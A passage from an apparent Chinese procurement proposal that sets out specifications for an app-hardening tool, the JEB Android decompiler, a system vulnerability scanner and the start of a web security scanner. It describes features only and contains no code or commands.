Hook工具篡改动态映射、外部关系进行hook攻击，提高应用程序的安全性和抵抗攻击的能力。</li><li>工具APP加固检测能有效防止恶意用户利用Cycript指令进行代码注入攻击，确保应用安全，Cycript是一种iOS逆向工程工具，攻击者可能会利用它来进行恶意代码注入。加固工具应能够检测并阻止此类攻击，确保APP的安全性和稳定性</li><li>为确保应用安全，该工具APP采取了强化措施，有效防止代码被篡改。通过对代码完整性进行细致的安全校验，它能够及时发现并阻止任何非法篡改企图，确保应用的原始代码不受侵害，从而保护用户数据和应用功能的完整性。这种防篡改技术是维护应用安全的关键一环。</li><li>本工具APP的动态保护功能采用独特的源代码一体化自动加固技术，确保了加固过程与应用本身的紧密结合。这种方法极大地减少了因依赖外部SDK集成而产生的单点绕过风险，让开发者不再需要担心因集成不当导致的安全漏洞，从而提供了更为可靠和稳固的保护效果。</li><li>本工具APP提供的所有动态保护功能，均通过源代码一体化自动加固技术实现，在APP运行时开启自动守护功能，对调试行为进行实时监测和阻断，通过监测调试行为，及时发现并阻止潜在的攻击者使用调试技术进行分析和篡改，避免了传统基于SDK集成可能带来的单点绕过风险。这种加固方法提高了安全性，确保了应用在面对各种攻击时的防御能力，让开发者无需担心安全漏洞，专注于提升用户体验</li><li>该工具APP具备自动守护功能，在APP运行时激活，能够实时监测任何hook行为，一旦检测到异常，立即进行阻断，确保应用运行环境的安全性</li><li>此工具APP支持强大的防Inline Hook功能，确保代码安全。Inline Hook是一种常见的攻击技术，攻击者通过修改应用程序的指令来实现hook操作。加固工具应能够检测并阻止Inline Hook攻击，确保应用程序不会被轻易劫持或篡改</li><li>该APP加固工具有效支持防Swizzling Hook机制，保障应用安全，Swizzling是一种在Objective-C中常用的技术，攻击者可能会利用它来劫持方法调用。加固工具应能够检测并阻止Swizzling攻击，确保应用程序的安全性和稳定性</li><li>本工具APP在运行时自动开启守护功能，实时对代码段进行完整性校验，通过监测代码段的完整性，及时发现并阻止任何未经授权的修改，确保应用程序的安全性和稳定性，确保应用免受篡改</li><li>本工具通过控制流平坦化技术，通过对应用程序的代码进行分析，识别出程序的控制流结构，包括条件分支、循环和函数调用等，在保证程序原有语义不变的情况下，对控制流进行混淆处理，增强代码安全性。再对跳转逻辑的判断值进行隐藏，增加攻击者逆向分析的难度</li><li>本工具支持隐藏跳转逻辑的判断值，通过对判断值进行变量替换、常量替换或逻辑运算等操作，使得原始的判断值变得模糊或复杂，使得攻击者在进行逆向分析时需要经过更多的推理和分析，才能确定真实的判断条件和执行路径，以此来复杂化逆向分析流程，增加攻击者逆向分析的难度</li><li>本工具APP通过规则或配置文件确定需要加密的字符串范围，可以选择对整个应用程序或特定的代码模块、类、方法等进行加固。加密过程通常包括使用加密算法对字符串进行转换，将其转换为不可读的形式，以此对字符串进行加密，增强安全性。同时支持用户自定义加固范围选择，使用者可以自定义需要加过的字段、类、数据等，以这种灵活的方式应对不同的安全需求</li><li>该工具通过增设虚假控制分支，混淆真实逻辑，大幅提高了破解及分析原始控制流的复杂性，能够增加新的虚假控制分支，以加大破解和分析原始控制流的难度。通过引入虚假控制流，使得攻击者难以理解原始代码的逻辑和功能，从而提高APP的安全性和稳定性。</li><li>本工具引入随机性混淆代码，确保每次加固后的应用代码都独一无二，过引入随机因素，使得攻击者难以预测和识别代码的逻辑和结构，从而增加破解的难度和成本。</li><li>该工具通过检测和阻断GDB、LLDB等调试器，通过采用反调试技术，确保应用程序在运行过程中不会被轻易调试和分析，提高其安全性，有效避免了代码被动态调试和分析，从而增强了应用的安全防护</li><li>本工具防御Inline Hook，通过检测和防范Inline Hook攻击，确保应用程序不会被轻易篡改或劫持，提高其安全性和稳定性，禁止修改代码段和机器码，抵御如frida等工具的hook攻击，确保代码完整性</li><li>本工具APP加固检测的所有动态保护功能都是基于源代码一体化实施的自动加固技术，避免了传统基于SDK集成方式可能存在的单点绕过风险。这种方法确保了从底层到高层的全方位安全防护，使得应用更为坚固</li><li>提供的license和数据库在三年之内为方提供免费升级服务，确保用户体验持续优化</li></ol><h4 id="技术实现内容-53"><a href="#技术实现内容-53" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="软件方案-15"><a href="#软件方案-15" class="headerlink" title="软件方案"></a>软件方案</h5><p>1. 加密与加壳模块</p><p>DEX加密与加壳：对DEX文件进行全面加密，并应用外壳保护，防止静态分析和反编译。</p><p>SO文件保护：对SO文件执行加密和加壳操作，隐藏重要信息，如字符串和函数表。</p><p>资源文件加密：对assets、res目录下的资源文件进行加密，确保资源文件的安全。</p><p>2. 代码虚拟化与混淆模块</p><p>虚拟机技术：将DEX字节码转换为自定义虚拟机操作码，通过自定义虚拟机执行。</p><p>多套虚拟机混合保护：采用多种虚拟机和指令集，提供多层保护。</p><p>控制流平坦化：混淆控制流，使得逆向工程变得更加困难。</p><p>字符串和资源混淆：对敏感字符串和资源进行加密和混淆。</p><p>3. 完整性校验模块</p><p>APK完整性校验：对APK文件进行完整性校验，确保未被篡改或重新打包。</p><p>签名校验：在运行时校验APK的签名，确保其合法性。</p><p>文件完整性保护：对DEX、SO、脚本文件等进行完整性校验。</p><p>4. 动态保护模块</p><p>反调试保护：防止通过调试技术对应用进行分析。</p><p>反Hook保护：防止利用Xposed、Cydia Substrate、Frida等工具进行Hook攻击。</p><p>内存保护：防止内存dump和恶意代码注入。</p><p>5. 数据文件保护模块</p><p>数据库加密：对SQLite等数据库文件进行透明加密保护。</p><p>配置文件加密：对SharedPreferences、XML等配置文件进行加密保护。</p><p>文件绑定：将加密后的数据文件与设备进行绑定，防止文件复用和盗用。</p><p>6. 游戏文件保护模块</p><p>Unity DLL保护：对C#开发的Unity游戏核心DLL文件进行加密。</p><p>Cocos lua脚本保护：对Lua语言开发的Cocos游戏核心lua脚本进行加密。</p><p>7. 兼容性与集成模块</p><p>多格式支持：支持对aab文件等新格式的加固保护。</p><p>集成兼容性：确保工具可以无缝集成到现有的开发和部署流程中。</p><p>8. 用户界面（UI）和配置模块</p><p>友好的UI：提供直观的用户界面，方便用户选择加固选项和监控加固过程。</p><p>配置管理：让用户能够自定义加固的参数和规则。</p><p>9. 安全监控与日志模块</p><p>实时监控：监控应用运行时的安全状态，及时发现异常行为。</p><p>日志记录：记录所有关键操作和事件，便于事后分析和审计。</p><p>10. 更新与维护模块</p><p>自动更新：自动下载和应用加固工具的更新，确保防护措施始终保持最新。</p><p>维护支持：提供技术支持和维护服务，确保用户能够高效使用工具。</p><p>11. 测试与质量保证模块</p><p>自动化测试：提供全面的自动化测试，确保每次更新后的加固质量。</p><p>性能监控：监控加固后应用的性能，确保用户体验不受影响。</p><h5 id="工具功能-15"><a href="#工具功能-15" class="headerlink" title="工具功能"></a>工具功能</h5><p>对加固壳的自身SO文件进行保护：加固壳的SO文件是加固工具的核心组成部分，它们通常包含了防御逻辑和加密算法。的工具将使用多层次的保护策略，包括代码混淆、反调试技术、以及自我修改代码能力，确保SO文件即使在被提取出来后，也无法被第三方破解工具所分析和理解。</p><p>防止自动化工具脱壳：自动化脱壳工具旨在绕过应用加固，恢复原始代码。的加固工具采用动态执行和代码变形技术，使得自动化工具无法确定脱壳的正确时机和方法，从而有效防止脱壳行为。</p><p>对DEX文件整体加密、加壳保护：DEX文件包含了应用的Dalvik字节码，是Android应用逆向工程的主要目标。的加固工具将对DEX文件进行整体加密，并应用加壳技术，使得未经授权的静态分析工具无法还原源代码。</p><p>对DEX代码内的明文字符串进行加密保护：明文字符串往往包含敏感信息，如API密钥、服务器地址等。通过加密这些字符串，确保即使DEX文件被反编译，这些信息也不会轻易泄露。</p><p>对DEX内的代码进行静态抽取和加密：的工具支持对DEX文件内的类和方法进行静态抽取，将其加密存储，并在运行时动态解密执行。这种方法不仅增加了逆向工程的难度，而且也在一定程度上防止了动态调试。</p><p>自定义虚拟机操作码：通过将DEX字节码转换为自定义的虚拟机操作码，并在自定义虚拟机中解释执行，可以有效地隐藏程序的真实逻辑，增加逆向工程的复杂度。</p><p>多套虚拟机及指令的复合保护技术：实现了多种自定义虚拟机和指令集，通过复合保护技术，为每个应用创建独一无二的保护模式，使得攻击者无法通过分析一款应用来攻破其他应用。</p><p>最小细粒度的独立虚拟化保护：为了进一步提高安全性，的工具支持对每个函数实施独立虚拟化保护，为其分配独特的指令集，使得攻击者无法构建持续有效的攻击策略。</p><p>全范围函数的虚拟化保护（VMP）：VMP技术覆盖了全部代码，不仅防止静态分析，同时也使得运行时的动态dump变得极其困难。</p><p>对SO文件及其内部信息的保护：对SO文件进行加密和加壳保护，同时对内部的字符串和函数表信息进行加密隐藏，防止通过IDA等工具进行逆向分析。</p><p>对Unity和Cocos游戏文件的加密保护：对于使用C#语言开发的Unity游戏核心DLL文件和Lua语言开发的Cocos游戏核心lua脚本文件，提供了专门的加密保护方案，确保这些游戏脚本不会被轻易篡改和逆向。</p><p>完整性校验：对APK内的所有文件进行完整性校验，确保它们没有被篡改或二次打包。同时，在APK运行时，会校验其签名的合法性，进一步保障应用的完整性和安全性。</p><p>动态保护：的动态保护功能可以实时监测和阻断调试和hook行为，基于源代码一体化自动加固实现，避免了基于SDK集成可能带来的单点绕过风险。</p><p>透明加密保护：支持对包括数据库文件、SharedPreferences数据文件、Webview数据文件在内的各种数据文件进行透明加密保护，并且可以将这些加密后的数据文件与设备绑定，防止文件复用和盗用。</p><p>控制流平坦化和混淆：在不改变程序语义的前提下，的工具可以通过控制流平坦化混淆程序的控制流，隐藏跳转逻辑的判断值，增加逆向分析的难度。同时，混淆每次都引入随机性，保证每次生成的混淆代码都是独一无二的。</p><p>防止动态调试和Hook攻击：的加固工具能够防止通过GDB、LLDB等工具进行动态调试，以及通过Inline Hook和Swizzling Hook工具进行的代码篡改攻击。</p><h3 id="Android应用程序反编译工具"><a href="#Android应用程序反编译工具" class="headerlink" title="Android应用程序反编译工具"></a>Android应用程序反编译工具</h3><h4 id="工具概述-12"><a href="#工具概述-12" class="headerlink" title="工具概述"></a>工具概述</h4><p>安卓应用程序反编译可支持常见的Android应用程序包的静态及动态分析，可以进行反编译。</p><h4 id="功能实施方案-61"><a href="#功能实施方案-61" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>提供的该产品信息如下：</p><p>品牌：PNF Software</p><p>型号：JEB</p><p>数量：1套</p><p>参数信息如下：</p><ol><li>该工具是一款专业级的Android应用程序反编译检测工具，它提供了全面的逆向工程分析能力。用户可以依赖此工具进行Dalvik字节码的反编译，以及对ARM和ARM64架构的机器代码进行深入的反编译工作。此外，它还支持对各种Android APK文件进行反编译，无论是标准的dex文件、优化后的odex文件，还是扩展格式的x-apk文件，都能够被该工具精确分析。对于Linux环境下的ELF/ELF64文件，也同样提供了反编译功能。除了反编译外，该工具还支持Dalvik、ARM(包括32位和Thumb指令集)以及ARM64(Aarch64)的反汇编，使得开发者可以更加详细地查看底层指令。在调试方面，该工具也同样支持Dalvik、ARM和ARM64的调试，使得开发人员能够在调试过程中识别和修复潜在的安全问题，从而提高应用的安全性。这些功能的集合使得该工具成为Android平台上反编译检测的强有力工具，能够帮助开发者和安全分析师有效地进行安全检查和漏洞挖掘；</li><li>该工具支持对Android应用文件APK进行全面的静态与动态分析，帮助开发者识别安全漏洞。静态分析可以检测应用程序的代码逻辑和结构，而动态分析则能够观察应用程序在运行过程中的行为。通过深入检查APK文件结构及其在运行时的行为，工具能够有效地揭示代码中的隐患和潜在威胁，为应用安全提供坚实的保障；</li><li>该工具提供了直观的可视化用户界面，极大地简化了反编译过程。它支持检查代码中的交叉引用，并允许用户对方法、函数和符号进行重新命名，以增强代码的可读性。此外，工具还支持在字段、类、代码和数据之间进行高效导航，使得开发者可以轻松地在复杂的代码结构中找到所需信息，从而提高了分析的效率和准确性；</li><li>该工具提供的license和数据库升级服务，确保用户在购买后三年内能够获得最新的功能和安全更新。</li><li>提供了产品使用手册，见“使用手册”。</li></ol><h4 id="技术实现内容-54"><a href="#技术实现内容-54" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="软件方案-16"><a href="#软件方案-16" class="headerlink" title="软件方案"></a>软件方案</h5><p>架构设计：采用模块化设计，包括用户界面模块、文件处理模块、反编译模块、反汇编模块、调试模块、解析模块等。模块之间通过接口进行通信，实现功能的独立性和可扩展性。</p><p>用户界面模块：提供可视化用户界面，包括菜单、工具栏、文件选择器、结果显示窗口等，使用户能够方便地操作和查看分析结果。</p><p>文件处理模块：负责处理不同类型的文件，包括APK文件、DEX文件、ODEx文件、X-APK文件、Linux ELF文件、ELF64文件等。该模块提供文件解析、读取、写入等功能。</p><p>反编译模块：Dalvik字节码反编译：将APK中的.dex文件转换为Java源代码；ARM/ARM64反编译：将基于ARM架构的二进制代码转换为高级语言代码；Android APK反编译：处理APK文件中的各种格式（dex, odex, x-apk）并将其转换为源代码；Linux ELF/ELF64文件反编译：支持Linux系统下的二进制文件反编译。</p><p>反汇编模块：支持Dalvik反汇编、ARM反汇编、ARM64反汇编等。该模块将目标文件转换为汇编代码，以便进行底层分析和调试。</p><p>调试模块：支持Dalvik调试、ARM调试、ARM64调试。该模块提供Dalvik和ARM/ARM64调试器，支持针对Dalvik虚拟机运行的应用和在实体设备和模拟器上进行ARM架构的应用调试。允许用户在目标应用程序中设置断点、观察变量、单步执行等。</p><p>解析模块：支持解析常见的Android应用文件，包括HTML、XML、JSON、(B)plist等结构化文件，以及图像文件、证书文件、Mach-O执行文件等。该模块提供解析和展示这些文件的内容。</p><p>插件系统：允许第三方开发者贡献额外的功能和改进。</p><p>自动化脚本：让用户可以编写脚本来自动化常见的反编译任务。</p><p>报告和文档：生成详细的分析报告和文档，方便用户理解和分享结果。</p><h5 id="工具功能-16"><a href="#工具功能-16" class="headerlink" title="工具功能"></a>工具功能</h5><ol><li><p>工具提供对Android平台上主流的执行代码和文件格式的广泛支持。对于Dalvik虚拟机产生的.dex文件，工具能够实现反编译。对于ARM架构，工具不仅支持32位代码的反编译和反汇编（包括Thumb指令集），还支持64位ARM架构（ARM64或Aarch64）的反编译和反汇编，确保了对现代Android设备的全面覆盖。针对Android APK文件，工具能够处理标准的dex文件、优化后的odex文件以及扩展的x-apk文件。对于Linux环境，工具同样支持ELF和ELF64文件格式的反编译。在反汇编方面，工具能够将Dalvik字节码、ARM和ARM64指令集转换为人类可读的汇编语言。在调试支持方面，该工具提供了对Dalvik、ARM和ARM64架构的调试能力。</p></li><li><p>工具支持对APK文件的静态和动态分析。静态分析允许用户在不执行代码的情况下评估其结构，包括权限、代码流和库依赖等。动态分析方面，工具能够在应用程序运行时监控其行为，包括API调用、网络活动和文件访问等。</p></li></ol><p>3)工具将包含一个直观的可视化用户界面，使开发者能够轻松地进行交叉引用检查和代码导航。用户可以对方法、函数和符号进行重新命名，以符合其在逆向工程中的理解，这有助于提高代码的可读性。此外，工具支持在字段、类、代码和数据之间的导航。</p><h4 id="使用手册"><a href="#使用手册" class="headerlink" title="使用手册"></a>使用手册</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/b429bd13c9da67eafdb6b089fb5ce120.jpeg" alt="jeb工具使用手册_01"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/60ea584d6e5c69f2dffd8e0d945a37ad.jpeg" alt="jeb工具使用手册_02"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/cbbdb20cc7cb9b52f1d6e58f4f00b813.jpeg" alt="jeb工具使用手册_03"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/decc71b37b2cc2719c290160f85cd76a.jpeg" alt="jeb工具使用手册_04"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/7499cc01184a0ee8993d19c4387b921b.jpeg" alt="jeb工具使用手册_05"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8efc9a2c654a72923b38d7fd34bb420b.jpeg" alt="jeb工具使用手册_06"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/93895367ff073e4d7cf84fe569f8fa06.jpeg" alt="jeb工具使用手册_07"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/569a2a0250bd602119658f58441bc64a.jpeg" alt="jeb工具使用手册_08"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c58356a3849edb57c494710f33c953ed.jpeg" alt="jeb工具使用手册_09"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f452a7a0bfe3ca7244abd6a949dba922.jpeg" alt="jeb工具使用手册_10"></p><h3 id="系统漏洞扫描工具"><a href="#系统漏洞扫描工具" class="headerlink" title="系统漏洞扫描工具"></a>系统漏洞扫描工具</h3><h4 id="工具概述-13"><a href="#工具概述-13" class="headerlink" title="工具概述"></a>工具概述</h4><p>工具具有扫描任意端口任意服务的能力；以用户指定的格式（ASCII 文本、html 等）产生详细的输出报告，包括目标的脆弱点、怎样修补漏洞以防止黑客入侵及危险级。</p><h4 id="功能实施方案-62"><a href="#功能实施方案-62" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>功能参数如下：</p><p>提供的该工具信息如下：</p><p>品牌：国利</p><p>型号：GLscncg</p><p>数量：1套</p><p>参数信息如下：</p><ol><li>该工具具备多种主动发现方法，包括多种主动扫描、主动探测方式，能高效识别系统漏洞</li><li>本工具通过监控网络活动和网络日志，有效地识别临时接入和不受管理的设备，确保网络环境的安全性和完整性</li><li>该系统漏洞扫描工具提供全面的支持范围，覆盖物理、虚拟和云基础设施，能够对各种服务器、端点、网络设备、操作系统、数据库以及应用程序进行深入的安全检查。无论是传统的IT环境还是现代的云服务平台，该工具都能确保最广泛的资产受到严密的安全监控，帮助企业及时发现并修复潜在的安全漏洞</li><li>本工具的系统漏洞扫描功能支持非凭据的远程扫描以及凭据的本地扫描，这允许用户对在线和离线的资产进行全面分析，无论是在本地网络还是远程位置。通过这两种扫描方式，工具能够提供深入且具体的安全漏洞分析，确保对系统的完整性和安全性有一个全方位的了解，从而有效地加强企业的网络安全防护</li><li>该工具提供多种扫描模式，使企业能够更频繁地对更多资产进行检查，有效缩小攻击面，增强安全防护。这些模式包括快速扫描、深度扫描和定制扫描，均旨在确保企业能够及时发现并解决潜在的安全威胁，保障其业务的连续性和数据的安全</li><li>通过分析网络流量，该工具能够精确识别新的、临时的和不受管理的资产，包括服务器和客户端，进而评估它们的漏洞风险。这一功能对于捕捉通常难以侦测的短暂设备特别有效，确保这些潜在的安全漏洞不会被忽视。它还帮助企业构建起一个完整的资产清单，包括那些未经授权或未被及时更新的设备，从而提供全面的安全态势评估和加强防御体系</li><li>该工具支持多种合规性标准和框架，包括PCI DSS、HIPAA/HITECH、NERC标准的模板，同时也支持FISMA、GLBA和SOX标准，确保企业在不同法规要求下的合规性。此外，工具还提供了CERT、CIS、COBIT/ITIL、DISA STIGs和NIST标准的模板，这大大简化了合规性审计过程，帮助企业高效地进行安全评估和漏洞管理，确保他们能够符合行业最佳实践和监管要求。通过这些模板，企业能够自动化合规性检查流程，减少手动工作量</li><li>该系统漏洞扫描工具能够在检测到事件异常时，自动记录详细信息，并根据预设规则选择性地发出警报，及时通知管理员采取行动。这一功能极大提高了对潜在威胁的速度和有效性</li><li>该工具在网络中自动侦测并记录之前从未见过的用户、设备和连接。一旦检测到这些新的或未授权的实体，系统将根据安全策略选择性地发出警报，保证网络管理员能够迅速获取信息并评估潜在的安全风险。这种实时监控和警报机制是确保网络安全、防止未授权访问的关键手段，它增强了对新威胁的可视性和控制能力。</li><li>系统漏洞扫描工具通过使用已知的僵尸网络和C&amp;C系统的特征和指标，可以检测到与这些网络和系统相关的传入和传出通信，包括特定的网络流量模式、恶意域名或IP地址、通信协议和端口等。扫描工具会对系统的网络流量进行监测和分析，识别出与已知僵尸网络和C&amp;C系统相关的通信行为，及时拦截并报告这些潜在的威胁活动。</li><li>此系统漏洞扫描工具设计为灵活且功能强大，支持与补丁管理平台、移动设备管理系统、云基础设施及威胁情报应用程序等进行无缝交互操作。通过这种集成，工具不仅能够自动发现和修复软件漏洞，还能为移动和云环境提供实时的安全监控，同时利用最新的威胁情报来增强防御能力，确保企业IT资产全面受到保护。</li><li>该漏洞扫描工具的API支持集中管理，简化了报告流程，自动化了漏洞更正，并优化了工作流，从而提高了安全团队的效率。</li><li>本工具能够在工具中选定的需要特别管制的漏洞风险或检测到的警报，通过电子邮件将警报信息发送给对应的人员，确保及时和处理潜在威胁。</li><li>此系统漏洞扫描工具的高效功能包括创建工单、设置工单内容并分配工单的功能，以便对发现的安全事件进行进一步调查和处理，确保每一项风险都得到妥善管理。</li><li>该漏洞扫描工具具备将关键安全事件发送到企业SIEM系统的能力，实现事件的集中监控与分析，从而加强了安全态势的实时感知和。</li><li>该漏洞扫描工具具备报告自动分发功能，能够自动分发详尽的报告到内置的报告库中，供安全分析师审查和归档，提升了报告管理的效率和可访问性。</li><li>本工具提供了一个整洁的可视化操作界面，通过操作界面可进行漏洞风险的整理，同时将整理后的风险漏洞信息根据归类进行整合，使安全团队能够直观地识别和评估系统中的安全漏洞。</li><li>该系统漏洞扫描工具的可视化操作界面中，折线图功能能够展示长期的漏洞变化情况，有利于研究人员进行漏洞风险分析和状态变化的查看，帮助用户追踪安全趋势。</li><li>此工具能够自动记录网络事件和活动，根据管理员设定的风险等级，工具将自动把这些网络事件和活动报告库分发给对应的团体或人员，便于后续的审计和分析工作。</li><li>该系统漏洞扫描工具具备可视化展示功能，根据不同的展示需求，能够一目了然地将漏洞风险、事件和网络活动的综合信息在大屏上进行展示，可以大幅提高用户的工作效率。</li><li>该系统漏洞扫描工具的可视化操作界面中，折线图功能能够展示长期的漏洞风险、实件和网路活动状态变化情况，有利于研究人员进行漏洞风险分析和状态变化的查看，帮助用户追踪安全趋势。</li><li>该系统漏洞扫描工具突破以往技术限制，实现了无扫描网段限制的功能，能够全面覆盖监测整个网络环境。</li><li>本工具能够及时动态更新漏洞库，确保系统安全性，用户总能使用到包含最新漏洞签名的最新版。</li><li>该系统漏洞扫描工具具备灵活性，支持移动部署，适应各种不同的网络环境和业务需求。</li><li>这款高级系统漏洞扫描工具具备强大的并发能力，能够同时并发扫描32个IP，大幅提升了网络安全检测的效率。</li><li>本系统漏洞扫描工具支持移动设备扫描，确保企业移动办公环境的安全性，提升整体网络防护水平。</li><li>该系统漏洞扫描工具遵循最新合规标准，内置合规标准的测试模板，可以帮助企业满足严格的法规要求，确保业务运作符合规定。</li><li>本工具可以帮助用户执行PCIDSS要求，提供安全配置、系统强化等功能，确保系统数据、文件等安全，防范安全风险。</li><li>本系统漏洞扫描工具支持对多种不同测试对象的测试，包括对虚拟化环境、各类操作系统、数据库以及网络应用程序云进行深入扫描，同时适用于云基础设施，可最大程度的覆盖系统漏洞扫描的需求。</li><li>提供license，包含数据库在内的功能。。</li></ol><h4 id="技术实现内容-55"><a href="#技术实现内容-55" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="软件方案-17"><a href="#软件方案-17" class="headerlink" title="软件方案"></a>软件方案</h5><p>软件架构设计：软件架构包括登录与认证、仪表盘、扫描管理、警报与事件、报告模板、设置与配置、资产管理、知识库、高级分析工具、API与集成模块。模块之间通过接口进行通信，实现功能的独立性和可扩展性。</p><p>1. 登录与用户认证模块</p><p>登录界面：安全的登录页面，支持多因素认证。</p><p>用户管理：允许管理员添加、删除和管理用户账户和权限。</p><p>2. 仪表盘</p><p>系统状态概览：显示整体安全状况，包括活动警报和最近的扫描结果。</p><p>扫描进度监控：实时显示当前扫描任务的进度和状态。</p><p>快速入口：提供快速访问常用功能的入口，如启动扫描、查看报告等。</p><p>3. 扫描管理</p><p>新建扫描任务：允许用户配置和启动新的漏洞扫描任务。</p><p>扫描计划：设置定期扫描的时间表和重复规则。</p><p>历史扫描记录：查看过往的扫描结果和历史数据。</p><p>4. 警报与事件</p><p>警报列表：展示当前的安全警报和事件，包括详细信息和状态。</p><p>事件处理：对选定的警报进行分类、注释和关闭操作。</p><p>工单生成：从警报中创建工单，并分配给相应的处理人员。</p><p>5. 报告模块</p><p>报告生成：根据用户选择的参数生成定制化的报告。</p><p>报告查看：在线查看或下载已生成的报告。</p><p>报告历史：存档和检索以往的报告。</p><p>6. 设置与配置</p><p>扫描配置：定义扫描的范围、深度和行为，如凭据扫描、非凭据扫描等。</p><p>通知设置：配置警报通知的方式，如电子邮件、短信或集成到其他系统。</p><p>合规性标准：选择和定制合规性扫描模板，如PCI DSS、HIPAA等。</p><p>7. 资产管理</p><p>资产清单：录入和管理组织内的资产信息。</p><p>资产分组：对资产进行分类和分组，以便于管理和扫描。</p><p>8. 知识库</p><p>漏洞信息：提供详细的漏洞信息和修复建议。</p><p>帮助文档：包含工具使用说明、FAQ和故障排除指南。</p><p>联系支持：提供联系技术支持的途径。</p><p>9. 高级分析工具</p><p>趋势分析：展示漏洞发现和修复的趋势图表。</p><p>风险评估：基于扫描结果进行风险评估和优先级排序。</p><p>10. API与集成</p><p>API访问：提供API接口的文档和管理工具。</p><p>集成选项：配置和管理与其他系统的集成，如SIEM、MDM等。</p><h5 id="工具功能-17"><a href="#工具功能-17" class="headerlink" title="工具功能"></a>工具功能</h5><p>漏洞扫描工具具备多种主动发现方法，包括：端口扫描：系统能够执行快速的端口扫描，以发现开放的端口和相关服务，从而识别潜在的入侵点。应用程序扫描：能够检查应用程序的运行时行为，包括常用的Web应用程序，以发现诸如SQL注入、跨站脚本等漏洞。网络扫描：通过网络扫描，系统侦测到网络中的所有设备，包括路由器、交换机、打印机等，并对它们的安全状况进行评估。</p><p>网络监控：工具能够监控网络活动和网络日志，以便识别临时或不受管理的设备，这些设备可能成为网络中的薄弱环节。监控应包括流量分析和异常行为检测。</p><p>广泛的支持范围：工具具备跨平台的扫描能力，并能够理解和处理各种不同的系统架构和配置，系统支持在物理、虚拟和云基础设施中广泛的服务器、端点、网络设备、操作系统、数据库和应用程序。</p><p>扫描类型：工具支持以下两种扫描类型：非凭据扫描：远程扫描，无需系统凭据，用于快速识别网络中的设备和服务；凭据扫描：本地扫描，使用系统凭据，能够进行更深入的系统检查，包括未安装补丁的检测、配置错误和系统弱点。</p><p>多种扫描模式：为了缩小攻击面，工具提供多种扫描模式，如全面扫描、快速扫描、定时扫描和事件驱动扫描，企业可以根据需要频繁地扫描更多资产。</p><p>网络流量分析：通过分析网络流量，工具能够识别新的、临时的和不受管理的资产中的服务器和客户端漏洞风险。这包括对未知流量的深入分析，以便于识别潜在的威胁。</p><p>支持多种模板：工具支持多种合规性标准和模板，包括PCI、HIPAA/HITECH、NERC、FISMA、GLBA、SOX以及CERT、CIS、COBIT/ITIL、DISA STIGS和NIST等，以帮助企业满足特定的行业法规要求。</p><p>自动记录与警报：在发生事件异常或检测到新用户、设备和连接时，工具自动记录并可选择性地发出警报，以便及时采取行动。</p><p>交互操作性：漏洞扫描工具与补丁管理、移动设备管理、云服务和威胁情报应用程序等进行交互操作，便于集成和自动化工作流程。</p><p>API支持：工具提供API支持，以实现集中管理、报告、修复和工作流自动化，使得漏洞管理更加高效。</p><p>通知与工单系统：对于选定的漏洞风险或发生的警报，工具能够发送电子邮件警报，并创建工单以进行进一步的调查和处理。</p><p>事件管理与报告：工具能够将事件信息发送到企业安全信息和事件管理（SIEM）系统，并自动分发漏洞报告。</p><p>可视化界面与报告：工具提供整理和整合漏洞风险分析信息的可视化操作界面，以及长期漏洞风险、事件和网络活动状态的折线图表示。</p><p>网络范围与漏洞库更新：工具无扫描网段限制，并能够及时动态更新漏洞库至最新版，以确保安全措施的时效性。</p><p>移动部署与并发扫描：工具能够移动部署，适应企业的灵活性需求，并能够同时并发扫描多个IP地址（至少32个）。</p><p>移动设备扫描与合规性：工具支持移动设备扫描，帮助企业满足法规和企业要求，如执行PCI DSS要求以实现安全配置和系统强化。</p><p>支持范围：工具支持扫描包括虚拟化环境、操作系统、数据库、网络应用程序以及云服务在内的广泛技术栈。</p><h3 id="Web安全扫描工具"><a href="#Web安全扫描工具" class="headerlink" title="Web安全扫描工具"></a>Web安全扫描工具</h3><h4 id="工具概述-14"><a href="#工具概述-14" class="headerlink" title="工具概述"></a>工具概述</h4><p>作为一款自动化评估类工具,依据制定的策略对Web应用系统进行URL深度发现并全面扫描,寻找出Web应用真实存在的安全漏洞。</p><h4 id="功能实施方案-63"><a href="#功能实施方案-63" class="headerlink" 